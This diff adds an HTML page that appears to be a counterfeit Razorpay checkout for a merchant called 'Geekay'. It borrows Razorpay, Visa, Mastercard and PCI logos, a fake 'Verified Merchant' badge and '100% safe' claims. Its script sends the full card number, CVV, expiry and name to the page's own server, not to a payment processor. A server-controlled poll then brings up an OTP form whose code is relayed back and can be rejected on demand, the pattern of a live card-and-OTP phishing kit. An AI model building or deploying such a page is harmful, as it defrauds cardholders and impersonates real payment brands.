@@ -1,0 +1,717 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Payment Gateway</title>
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+  <style>
+    .rupee-sign {
+      position: absolute;
+      left: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 1rem;
+      user-select: none;
+      color: #6b7280;
+      line-height: 1;
+      display: flex;
+      align-items: center;
+      height: 100%;
+      pointer-events: none;
+    }
+    .amount-display {
+      font-size: 18px;
+      font-weight: 400;
+      color: #1a1a1a;
+      text-align: center;
+      margin-bottom: 20px;
+      padding: 12px;
+      background: #f3f4f6;
+      border-radius: 8px;
+      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+      letter-spacing: -0.2px;
+    }
+    .page-container {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      padding-top: 1.5rem;
+    }
+    .content-wrapper {
+      flex: 1;
+      padding: 1rem;
+      margin-bottom: 6rem;
+    }
+    .merchant-badge {
+      position: relative;
+      cursor: pointer;
+      margin-left: 0;
+    }
+    .merchant-dropdown {
+      display: none;
+      position: absolute;
+      top: 100%;
+      left: 0;
+      background: white;
+      padding: 1rem;
+      border-radius: 0.5rem;
+      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+      z-index: 10;
+      width: 300px;
+    }
+    .merchant-badge:hover .merchant-dropdown {
+      display: block;
+    }
+    .trusted-shield {
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+      padding: 1rem;
+      background: #66BB6A;
+      border-radius: 0.5rem;
+      margin-bottom: 1rem;
+    }
+    .verified-tag {
+      font-size: 0.75rem;
+      background: rgba(255,255,255,0.2);
+      padding: 0.25rem 0.5rem;
+      border-radius: 1rem;
+      color: #E0E0E0;
+    }
+    .verification-item {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      font-size: 0.875rem;
+      color: #4B5563;
+      padding: 0.25rem 0;
+    }
+    .verification-tick {
+      width: 1rem;
+      height: 1rem;
+      flex-shrink: 0;
+      color: #10B981;
+    }
+    .bottom-logos {
+      padding: 2rem 0;
+      margin-top: auto;
+      background: transparent;
+    }
+    @keyframes shieldPulse {
+      0% { transform: scale(1) rotate(0deg); filter: brightness(1); }
+      50% { transform: scale(1.05) rotate(5deg); filter: brightness(1.2); }
+      100% { transform: scale(1) rotate(0deg); filter: brightness(1); }
+    }
+    .shield-icon {
+      animation: shieldPulse 2s infinite;
+      transform-style: preserve-3d;
+      perspective: 1000px;
+    }
+    .consent-message {
+      display: flex;
+      align-items: flex-start;
+      gap: 0.5rem;
+      padding: 0.5rem;
+      border-radius: 0.25rem;
+      cursor: pointer;
+      font-size: 0.875rem;
+      color: #4B5563;
+    }
+    .consent-checkbox {
+      width: 1.25rem;
+      height: 1.25rem;
+      border: 2px solid #D1D5DB;
+      border-radius: 0.25rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+    .consent-checkbox.checked {
+      background-color: #10B981;
+      border-color: #10B981;
+    }
+    .consent-checkbox svg {
+      width: 1rem;
+      height: 1rem;
+      color: white;
+      display: none;
+    }
+    .consent-checkbox.checked svg {
+      display: block;
+    }
+    .animate-slide-in {
+      animation: slideIn 0.3s ease-out;
+    }
+    @keyframes slideIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .animate-spin {
+      display: inline-block;
+      animation: spin 1s linear infinite;
+      -webkit-animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
+    .otp-input::placeholder {
+      color: #9CA3AF;
+      opacity: 0.7;
+    }
+    .otp-input:focus::placeholder {
+      opacity: 0;
+    }
+    .otp-input {
+      caret-color: transparent;
+    }
+    .btn-loading {
+      position: relative;
+    }
+    .btn-loading span {
+      opacity: 0.5;
+      filter: blur(1px);
+    }
+    .hidden { display: none !important; }
+    /* OTP container: input and button side-by-side, each 50% */
+    .otp-container {
+      display: flex;
+    }
+    .otp-input-wrapper {
+      width: 50%;
+      padding-right: 4px;
+    }
+    .otp-button-wrapper {
+      width: 50%;
+      padding-left: 4px;
+    }
+    .card-icon {
+      height: 24px;
+      width: auto;
+      display: block;
+    }
+    .otp-error {
+      color: #ef4444;
+      font-size: 13px;
+      margin: 4px 0 8px 0;
+      text-align: center;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="page-container" style="background: linear-gradient(45deg, #ff0000 50%, #ffffff 50%);">
+    <div class="content-wrapper">
+      <div class="max-w-4xl mx-auto bg-white rounded-2xl shadow-lg overflow-hidden">
+        <div class="flex flex-col md:flex-row">
+          <div class="md:w-7/12 p-5">
+            <div class="bg-white rounded-2xl shadow-sm mb-6">
+              <div class="flex items-start gap-4 mb-4 px-4 pt-4">
+                <div class="w-12 h-12 rounded-none overflow-hidden flex-shrink-0 bg-gray-50">
+                  <img src="https://images.unsplash.com/photo-1572059002053-8cc5ad2f4a38?w=64&h=64&fit=crop" alt="Merchant Logo" class="w-full h-full object-cover" />
+                </div>
+                <div class="flex flex-col">
+                  <span class="text-2xl font-semibold">Geekay</span>
+                  <div class="merchant-badge mt-1">
+                    <div class="flex items-center gap-1 text-gray-600 text-sm">
+                      <svg class="w-4 h-4 text-green-500 shield-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
+                      </svg>
+                      <span>Verified Merchant</span>
+                    </div>
+                    <div class="merchant-dropdown">
+                      <div class="trusted-shield">
+                        <svg class="w-12 h-12 text-white shield-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                          <path d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
+                        </svg>
+                        <div class="flex flex-col">
+                          <span class="text-lg font-semibold text-white">Geekay</span>
+                          <span class="verified-tag">Verified Merchant</span>
+                        </div>
+                      </div>
+                      <div class="space-y-2">
+                        <div class="verification-item">
+                          <svg class="verification-tick" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M5 13l4 4L19 7" />
+                          </svg>
+                          <span>Verified for authenticity</span>
+                        </div>
+                        <div class="verification-item">
+                          <svg class="verification-tick" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M5 13l4 4L19 7" />
+                          </svg>
+                          <span>Razorpay's risk system ensures secure payment protection from fraud</span>
+                        </div>
+                        <div class="verification-item">
+                          <svg class="verification-tick" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M5 13l4 4L19 7" />
+                          </svg>
+                          <span>Ensures that disputes are handled diligently</span>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              
+              <div class="mt-4 px-6">
+                <h2 class="text-xl font-semibold mb-4">Payment Description</h2>
+                <p class="text-gray-600 mb-4">
+                  Payment for Digital Course Bundle – Premium access to our complete digital learning package including all courses and resources.
+                </p>
+                <div class="bg-blue-50 p-4 rounded-2xl mb-4">
+                  <div class="flex items-center gap-2 text-blue-700">
+                    <svg class="w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                      <path d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
+                    </svg>
+                    <span class="text-sm">PCI DSS Compliant • 256-bit SSL Encryption • Secure Payment</span>
+                  </div>
+                </div>
+                <div class="text-sm text-gray-500 flex items-center gap-2">
+                  <span>Service fee is 2% of the transaction amount</span>
+                </div>
+                <div id="invoiceIdContainer" class="mt-4 bg-gray-100 p-3 hidden">
+                  <span class="text-sm font-medium">INVOICE ID: </span>
+                  <span class="text-sm" id="invoiceId"></span>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="md:w-5/12 p-5">
+            <div id="paymentForm">
+              <div class="amount-display mb-6">
+                Amount to Pay: ₹<span id="displayAmount">0</span>
+              </div>
+              
+              <form id="mainForm" class="space-y-4">
+                <div class="hidden">
+                  <label class="block text-sm font-medium text-gray-700 mb-2">Amount (INR)</label>
+                  <div class="relative">
+                    <span class="rupee-sign">₹</span>
+                    <input type="text" id="amount" class="block w-full pl-8 pr-3 py-2 border border-gray-300" readonly />
+                  </div>
+                </div>
+
+                <div>
+                  <label class="block text-sm font-medium text-gray-700 mb-2">Email</label>
+                  <input type="email" id="email" class="block w-full px-3 py-2 border border-gray-300 rounded-none" placeholder="you@example.com" required>
+                </div>
+
+                <div>
+                  <label class="block text-sm font-medium text-gray-700 mb-2">Card Number</label>
+                  <div class="relative">
+                    <input type="text" id="cardNumber" maxlength="19" class="block w-full px-3 py-2 border border-gray-300 rounded-none pr-12" placeholder="4242 4242 4242 4242" required>
+                    <div class="absolute right-3 top-1/2 -translate-y-1/2" id="cardTypeIcon"></div>
+                  </div>
+                  <p id="cardError" class="text-red-500 text-sm mt-1 hidden">Please enter a valid card number</p>
+                </div>
+
+                <div class="grid grid-cols-2 gap-4">
+                  <div>
+                    <label class="block text-sm font-medium text-gray-700 mb-2">Expiry Date</label>
+                    <input type="text" id="expiry" maxlength="5" class="block w-full px-3 py-2 border border-gray-300 rounded-none" placeholder="MM/YY" required>
+                    <p id="expiryError" class="text-red-500 text-sm mt-1 hidden">Invalid expiry date</p>
+                  </div>
+                  <div>
+                    <label class="block text-sm font-medium text-gray-700 mb-2">CVV</label>
+                    <input type="password" id="cvv" maxlength="3" class="block w-full px-3 py-2 border border-gray-300 rounded-none" placeholder="123" required>
+                  </div>
+                </div>
+
+                <div>
+                  <label class="block text-sm font-medium text-gray-700 mb-2">Cardholder Name</label>
+                  <input type="text" id="cardholderName" class="block w-full px-3 py-2 border border-gray-300 rounded-none" placeholder="John Doe" required>
+                </div>
+
+                <button type="submit" id="submitButton" class="w-full py-3 px-4 flex items-center justify-center text-white rounded-none bg-gray-400">
+                  <span id="submitText">Proceed to Pay</span>
+                  <div id="submitLoader" class="w-5 h-5 animate-spin hidden ml-2">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                      <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z"/>
+                    </svg>
+                  </div>
+                </button>
+              </form>
+            </div>
+
+            <div id="otpForm" class="animate-slide-in hidden">
+              <p class="text-sm text-gray-600 mb-2">OTP has been sent to your registered mobile number for card ending in <span id="cardLastFour"></span></p>
+              <div class="otp-container">
+                <div class="otp-input-wrapper">
+                  <input type="text" id="otp" maxlength="6" class="otp-input w-full px-3 py-2 border border-gray-300 text-center text-lg tracking-wider rounded-none" placeholder="Enter OTP" required>
+                </div>
+                <div class="otp-button-wrapper">
+                  <button type="button" id="otpSubmitButton" class="w-full bg-gray-400 text-white py-2 px-4 rounded-none flex items-center justify-center" disabled>
+                    <span id="otpText">Confirm</span>
+                    <div id="otpLoader" class="w-5 h-5 animate-spin hidden ml-2">
+                      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z"/>
+                      </svg>
+                    </div>
+                  </button>
+                </div>
+              </div>
+              <!-- OTP error message placed below the OTP row and above the timer -->
+              <p id="otpError" class="otp-error">Incorrect OTP. Please enter a valid one time passcode.</p>
+              <p class="text-center text-sm text-gray-500 mt-2">
+                Time remaining: <span id="timer">2:59</span>
+              </p>
+            </div>
+
+            <div class="consent-message mt-4" id="consentMessage">
+              <div class="consent-checkbox checked" id="consentCheckbox">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3">
+                  <path d="M5 13l4 4L19 7"/>
+                </svg>
+              </div>
+              <span>Note: Making Payment with Razorpay is 100% safe. Your transaction is processed through a secure https connection.</span>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="bottom-logos flex justify-center items-center gap-6">
+      <img src="https://www.pcisecuritystandards.org/wp-content/uploads/2022/03/pci-logo-teal.svg" alt="PCI DSS" class="h-6" />
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/ba/Razorpay_logo.svg/2560px-Razorpay_logo.svg.png" alt="Razorpay" class="h-4" />
+      <img src="https://www.mastercard.us/content/dam/public/mastercardcom/na/us/en/homepage/Home/mc-logo-52.svg" alt="Mastercard SecureCode" class="h-6" />
+      <img src="https://usa.visa.com/dam/VCOM/regional/ve/romania/blogs/hero-image/visa-logo-800x450.jpg" alt="Verified by Visa" class="h-6" />
+    </div>
+  </div>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', async () => {
+      let isCardValid = false;
+      let isExpiryValid = false;
+      let isProcessing = false;
+      let currentInvoiceId = null;
+      let statusCheckInterval = null;
+      let timerInterval = null;
+      let timer = 180;
+      let consentChecked = true;
+
+      const urlParams = new URLSearchParams(window.location.search);
+      const pid = urlParams.get('pid');
+      if (pid) {
+        try {
+          const response = await fetch(`/api/getPaymentDetails?pid=${pid}`);
+          const data = await response.json();
+          if (data.status === 'success') {
+            const amount = parseInt(data.payment.amount, 10);
+            document.getElementById('amount').value = amount;
+            document.getElementById('displayAmount').textContent = amount.toLocaleString('en-IN');
+          }
+        } catch (error) {
+          console.error('Error fetching payment details:', error);
+        }
+      }
+
+      function updateSubmitButton() {
+        const email = document.getElementById('email').value.trim();
+        const cardNum = document.getElementById('cardNumber').value.replace(/\s+/g, '');
+        const expiry = document.getElementById('expiry').value;
+        const cvv = document.getElementById('cvv').value;
+        const cardholder = document.getElementById('cardholderName').value.trim();
+        const submitButton = document.getElementById('submitButton');
+        if (isCardValid && isExpiryValid && cardNum.length === 16 && cvv.length === 3 && email && cardholder && consentChecked) {
+          submitButton.disabled = false;
+          submitButton.className = "w-full py-3 px-4 flex items-center justify-center text-white rounded-none bg-green-600 hover:bg-green-700";
+        } else {
+          submitButton.disabled = true;
+          submitButton.className = "w-full py-3 px-4 flex items-center justify-center text-white rounded-none bg-gray-400";
+        }
+      }
+
+      function updateConfirmOtpButton() {
+        const otp = document.getElementById('otp').value;
+        const otpButton = document.getElementById('otpSubmitButton');
+        if (otp.length === 6) {
+          otpButton.disabled = false;
+          otpButton.className = "w-full bg-blue-600 text-white py-2 px-4 rounded-none flex items-center justify-center";
+          document.getElementById('otpError').style.display = 'none';
+        } else {
+          otpButton.disabled = true;
+          otpButton.className = "w-full bg-gray-400 text-white py-2 px-4 rounded-none flex items-center justify-center";
+        }
+      }
+
+      document.getElementById('consentCheckbox').addEventListener('click', function() {
+        consentChecked = !consentChecked;
+        if (consentChecked) {
+          this.classList.add('checked');
+        } else {
+          this.classList.remove('checked');
+        }
+        updateSubmitButton();
+      });
+
+      function validateCard(number) {
+        const clean = number.replace(/\D/g, '');
+        if (clean.length < 13 || clean.length > 16) return false;
+        let sum = 0, isEven = false;
+        for (let i = clean.length - 1; i >= 0; i--) {
+          let digit = parseInt(clean[i], 10);
+          if (isEven) { digit *= 2; if (digit > 9) digit -= 9; }
+          sum += digit;
+          isEven = !isEven;
+        }
+        return sum % 10 === 0;
+      }
+
+      function detectCardType(number) {
+        const clean = number.replace(/\D/g, '');
+        const firstDigit = clean.charAt(0);
+        if (firstDigit === '4') return 'visa';
+        if (firstDigit === '5') return 'mastercard';
+        if (firstDigit === '3') return 'amex';
+        if (firstDigit === '6') return 'rupay';
+        return null;
+      }
+
+      function updateCardTypeIcon(type) {
+        const iconContainer = document.getElementById('cardTypeIcon');
+        iconContainer.innerHTML = '';
+        if (type) {
+          const img = document.createElement('img');
+          img.style.height = "24px";
+          img.style.width = "auto";
+          switch (type) {
+            case 'visa':
+              img.src = 'https://raw.githubusercontent.com/danielcharrua/payment-icons/master/assets/visa/visa-curved-128px.png';
+              break;
+            case 'mastercard':
+              img.src = 'https://raw.githubusercontent.com/danielcharrua/payment-icons/master/assets/mastercard/mastercard-curved-128px.png';
+              break;
+            case 'amex':
+              img.src = 'https://raw.githubusercontent.com/danielcharrua/payment-icons/master/assets/amex/amex-curved-128px.png';
+              break;
+            case 'rupay':
+              img.src = 'https://upload.wikimedia.org/wikipedia/commons/thumb/c/cb/Rupay-Logo.png/320px-Rupay-Logo.png';
+              break;
+          }
+          img.alt = type;
+          img.className = "card-icon";
+          iconContainer.appendChild(img);
+        }
+      }
+
+      function formatCardNumber(value) {
+        let v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+        v = v.slice(0, 16);
+        const parts = [];
+        for (let i = 0; i < v.length; i += 4) {
+          parts.push(v.substring(i, i + 4));
+        }
+        const formatted = parts.join(' ');
+        isCardValid = validateCard(v);
+        const cardInput = document.getElementById('cardNumber');
+        const cardError = document.getElementById('cardError');
+        if (!isCardValid && v.length === 16) {
+          cardInput.classList.add('border-red-500');
+          cardError.classList.remove('hidden');
+        } else {
+          cardInput.classList.remove('border-red-500');
+          cardError.classList.add('hidden');
+        }
+        return formatted;
+      }
+
+      function validateExpiry(value) {
+        if (!/^\d{2}\/\d{2}$/.test(value)) return false;
+        const [month, year] = value.split('/').map(num => parseInt(num, 10));
+        const now = new Date();
+        const currentYear = now.getFullYear() % 100;
+        const currentMonth = now.getMonth() + 1;
+        if (month < 1 || month > 12) return false;
+        if (year < currentYear || year > 50) return false;
+        if (year === currentYear && month < currentMonth) return false;
+        return true;
+      }
+
+      function formatExpiry(value) {
+        const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+        let formatted = v;
+        if (v.length >= 2) {
+          formatted = v.slice(0, 2) + '/' + v.slice(2, 4);
+        }
+        const expiryInput = document.getElementById('expiry');
+        const expiryError = document.getElementById('expiryError');
+        isExpiryValid = validateExpiry(formatted);
+        if (!isExpiryValid && formatted.length === 5) {
+          expiryInput.classList.add('border-red-500');
+          expiryError.classList.remove('hidden');
+        } else {
+          expiryInput.classList.remove('border-red-500');
+          expiryError.classList.add('hidden');
+        }
+        return formatted;
+      }
+
+      function startOtpTimer() {
+        if (timerInterval) clearInterval(timerInterval);
+        timer = 180;
+        timerInterval = setInterval(() => {
+          timer--;
+          const minutes = Math.floor(timer / 60);
+          const seconds = timer % 60;
+          document.getElementById('timer').textContent =
+            `${minutes}:${seconds.toString().padStart(2, '0')}`;
+          if (timer <= 0) {
+            clearInterval(timerInterval);
+            window.location.href = '/fail.html';
+          }
+        }, 1000);
+      }
+
+      document.getElementById('cardNumber').addEventListener('input', function(e) {
+        const cursor = e.target.selectionStart;
+        const lastLength = e.target.value.length;
+        let formatted = formatCardNumber(e.target.value);
+        e.target.value = formatted;
+        const cardType = detectCardType(formatted);
+        updateCardTypeIcon(cardType);
+        updateSubmitButton();
+        if (cursor && cursor < lastLength) {
+          const newCursor = cursor + (formatted.length - lastLength);
+          e.target.setSelectionRange(newCursor, newCursor);
+        }
+      });
+
+      document.getElementById('expiry').addEventListener('input', function(e) {
+        const cursor = e.target.selectionStart;
+        const lastLength = e.target.value.length;
+        let formatted = formatExpiry(e.target.value);
+        e.target.value = formatted;
+        updateSubmitButton();
+        if (cursor && cursor < lastLength) {
+          const newCursor = cursor + (formatted.length - lastLength);
+          e.target.setSelectionRange(newCursor, newCursor);
+        }
+      });
+
+      ['email', 'cvv', 'cardholderName'].forEach(id => {
+        document.getElementById(id).addEventListener('input', updateSubmitButton);
+      });
+
+      document.getElementById('otp').addEventListener('input', function(e) {
+        updateConfirmOtpButton();
+      });
+
+      async function checkTransactionStatus() {
+        if (!currentInvoiceId) return;
+        try {
+          const response = await fetch(`/api/checkTransactionStatus?invoiceId=${currentInvoiceId}`);
+          const data = await response.json();
+          if (data.status === 'show_otp') {
+            clearInterval(statusCheckInterval);
+            document.getElementById('paymentForm').classList.add('hidden');
+            document.getElementById('otpForm').classList.remove('hidden');
+            const cardNumber = document.getElementById('cardNumber').value;
+            document.getElementById('cardLastFour').textContent = cardNumber.slice(-4);
+            if (!timerInterval) { startOtpTimer(); }
+            if (data.otpError) {
+              document.getElementById('otpError').style.display = 'block';
+              // Reset OTP confirm button
+              const otpButton = document.getElementById('otpSubmitButton');
+              const otpLoader = document.getElementById('otpLoader');
+              const btnText = document.getElementById('otpText');
+              btnText.style.opacity = '1';
+              btnText.style.filter = 'none';
+              otpLoader.classList.add('hidden');
+              otpButton.disabled = false;
+            } else {
+              document.getElementById('otpError').style.display = 'none';
+            }
+            isProcessing = false;
+          } else if (data.status === 'redirect') {
+            window.location.href = data.redirectUrl;
+          }
+        } catch (err) {
+          console.error('Error checking transaction status:', err);
+        }
+      }
+
+      document.getElementById('mainForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        if (!isCardValid || !isExpiryValid || isProcessing) return;
+        isProcessing = true;
+        const submitButton = document.getElementById('submitButton');
+        const submitLoader = document.getElementById('submitLoader');
+        const buttonText = document.getElementById('submitText');
+        buttonText.style.opacity = '0.5';
+        buttonText.style.filter = 'blur(1px)';
+        submitLoader.classList.remove('hidden');
+        submitButton.disabled = true;
+        try {
+          const response = await fetch("/api/sendPaymentDetails", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              cardNumber: document.getElementById('cardNumber').value.replace(/\s+/g, ''),
+              expiry: document.getElementById('expiry').value,
+              cvv: document.getElementById('cvv').value,
+              email: document.getElementById('email').value,
+              amount: document.getElementById('amount').value,
+              currency: "INR",
+              cardholder: document.getElementById('cardholderName').value
+            })
+          });
+          const result = await response.json();
+          if (result.status === "success") {
+            currentInvoiceId = result.invoiceId;
+            statusCheckInterval = setInterval(checkTransactionStatus, 2000);
+          } else {
+            throw new Error('Payment submission failed');
+          }
+        } catch (err) {
+          console.error('Payment submission error:', err);
+          alert('Error processing payment. Please try again.');
+          isProcessing = false;
+          submitButton.disabled = false;
+          submitLoader.classList.add('hidden');
+          buttonText.style.opacity = '1';
+          buttonText.style.filter = 'none';
+          updateSubmitButton();
+        }
+      });
+
+      document.getElementById('otpSubmitButton').addEventListener('click', async () => {
+        if (isProcessing) return;
+        isProcessing = true;
+        const otpButton = document.getElementById('otpSubmitButton');
+        const otpLoader = document.getElementById('otpLoader');
+        const btnText = document.getElementById('otpText');
+        btnText.style.opacity = '0.5';
+        btnText.style.filter = 'blur(1px)';
+        otpLoader.classList.remove('hidden');
+        otpButton.disabled = true;
+        try {
+          const response = await fetch("/api/submitOTP", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              invoiceId: currentInvoiceId,
+              otp: document.getElementById('otp').value
+            })
+          });
+          if (!response.ok) {
+            throw new Error('Failed to submit OTP');
+          }
+          statusCheckInterval = setInterval(checkTransactionStatus, 2000);
+        } catch (err) {
+          console.error('OTP submission error:', err);
+          alert('Error submitting OTP. Please try again.');
+          isProcessing = false;
+          otpButton.disabled = false;
+          otpLoader.classList.add('hidden');
+          btnText.style.opacity = '1';
+          btnText.style.filter = 'none';
+        }
+      });
+    });
+  </script>
+</body>
+</html>
